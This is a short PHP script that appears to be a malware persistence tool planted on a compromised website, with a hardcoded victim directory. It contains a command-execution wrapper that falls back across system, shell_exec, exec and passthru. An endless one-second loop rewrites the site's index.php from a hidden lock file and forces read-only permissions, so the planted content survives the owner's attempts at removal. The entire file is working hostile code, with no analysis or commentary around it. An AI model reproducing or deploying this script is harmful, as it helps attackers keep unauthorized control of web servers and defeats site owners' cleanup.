<?php

$tmp = "./";
$directory = "/home/orlandoattractions/public_html/tickets/"; // Directory must already exist
$geckoFile = $directory . "/index.php";

// Function to set system commands
function gecko_cmd($value) {
    if (function_exists("system")) {
        system($value);
    } else if (function_exists("shell_exec")) {
        shell_exec($value);
    } else if (function_exists("exec")) {
        exec($value);
    } else if (function_exists("passthru")) {
        passthru($value);
    }
}

// Function to retrieve file or directory permissions
function gecko_perm($path) {
    return file_exists($path) ? substr(sprintf("%o", fileperms($path)), -4) : false;
}

// Function to copy/replace index.php from source
function ensure_gecko_file($filePath, $tmp) {
    $sourceFile = $tmp . "/Acx0geckowplers0x.do.not.remove.this.Lock";

    if (file_exists($sourceFile)) {
        $data = file_get_contents($sourceFile);
        file_put_contents($filePath, $data);
        echo "index.php file copied to $filePath\n";

        // Set permissions after writing
        gecko_cmd("chmod 555 " . escapeshellarg($filePath));
    } else {
        echo "Source file not found: $sourceFile\n";
    }
}

// Check if target directory exists
if (!is_dir($directory)) {
    die("Target directory does not exist: $directory\n");
}

// Run in an infinite loop with 1-second delay
while (true) {
    ensure_gecko_file($geckoFile, $tmp);

    // Re-apply permissions if not 0444
    if (gecko_perm($geckoFile) != "0444") {
        gecko_cmd("chmod 444 " . escapeshellarg($geckoFile));
    }

    sleep(1); // Sleep to prevent CPU overuse
}
?>
